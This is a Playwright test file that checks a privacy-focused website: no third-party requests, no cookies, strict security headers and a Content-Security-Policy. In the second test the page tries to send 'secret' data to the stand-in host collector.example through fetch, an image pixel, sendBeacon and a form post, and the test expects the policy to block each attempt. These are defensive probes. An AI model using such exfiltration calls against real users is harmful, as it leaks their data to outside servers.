// Claims: "No accounts. No emails. No tracking." and "this site talks to nobody else".
import { expect, test } from "@playwright/test";
import { visitor, WEB } from "../lib/site";

const PAGES = ["/", "/hunts", "/create", "/demo", "/docs", "/docs/how-it-works", "/docs/privacy", "/docs/faq"];

test("every page loads from this site only: no other hosts, no cookies, no sockets", async ({ browser }) => {
  const v = await visitor(browser);
  for (const path of PAGES) {
    const res = await v.page.goto(path, { waitUntil: "networkidle" });
    expect(res!.status(), path).toBe(200);
    // Scroll through, so anything loaded lazily is loaded.
    await v.page.evaluate(async () => {
      for (let y = 0; y < document.body.scrollHeight; y += 600) {
        window.scrollTo(0, y);
        await new Promise((r) => setTimeout(r, 40));
      }
    });
    await v.page.waitForLoadState("networkidle");
  }
  expect(v.rec.otherHosts(WEB), "the browser contacted another host").toEqual([]);
  expect(await v.context.cookies(), "the site set a cookie").toEqual([]);
  expect(v.rec.sockets).toEqual([]);
  // Nothing but page loads: browsing sends no data.
  expect(v.rec.seen.filter((r) => r.method !== "GET").map((r) => `${r.method} ${r.path}`)).toEqual([]);
  expect(v.errors).toEqual([]);
  await v.context.close();
});

test("the browser is told to refuse every other server, and does", async ({ browser }) => {
  const v = await visitor(browser);
  const res = await v.page.goto("/create", { waitUntil: "networkidle" });
  const h = res!.headers();

  const csp = h["content-security-policy"];
  for (const rule of ["default-src 'self'", "connect-src 'self'", "object-src 'none'", "base-uri 'self'", "form-action 'self'", "frame-ancestors 'none'"]) {
    expect(csp, `Content-Security-Policy is missing ${rule}`).toContain(rule);
  }
  expect(csp).not.toMatch(/(^|[\s;])'unsafe-eval'/); // production: WebAssembly only, no eval
  expect(csp).not.toMatch(/https?:/); // no other origin is allowed anywhere in the policy
  expect(h["referrer-policy"]).toBe("no-referrer");
  expect(h["x-frame-options"]).toBe("DENY");
  expect(h["x-content-type-options"]).toBe("nosniff");

  // Try to send something out the three usual ways. Each must be stopped by the
  // policy (the browser reports which rule stopped it).
  const before = v.rec.mark();
  const stopped = await v.page.evaluate(async () => {
    const rules: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => rules.push(e.effectiveDirective));
    try {
      await fetch("https://collector.example/guess?g=secret");
    } catch {
      /* expected */
    }
    new Image().src = "https://collector.example/pixel.gif?g=secret";
    try {
      navigator.sendBeacon("https://collector.example/beacon", "secret");
    } catch {
      /* expected */
    }
    const form = document.createElement("form");
    form.action = "https://collector.example/form";
    form.method = "post";
    form.target = "_blank";
    document.body.appendChild(form);
    form.submit();
    await new Promise((r) => setTimeout(r, 800));
    return rules;
  });
  expect(stopped.filter((r) => r === "connect-src").length, "fetch and sendBeacon").toBeGreaterThanOrEqual(2);
  expect(stopped).toContain("img-src");
  expect(stopped).toContain("form-action");
  // Whatever the page attempted was refused by the policy before leaving the browser.
  for (const r of v.rec.since(before).filter((r) => r.url.includes("collector.example"))) {
    expect(v.rec.failed.get(r.url), `${r.url} was not stopped by the policy`).toMatch(/BLOCKED_BY_CSP|csp/i);
    expect(v.rec.answered.has(r.url)).toBe(false);
  }
  await v.context.close();
});
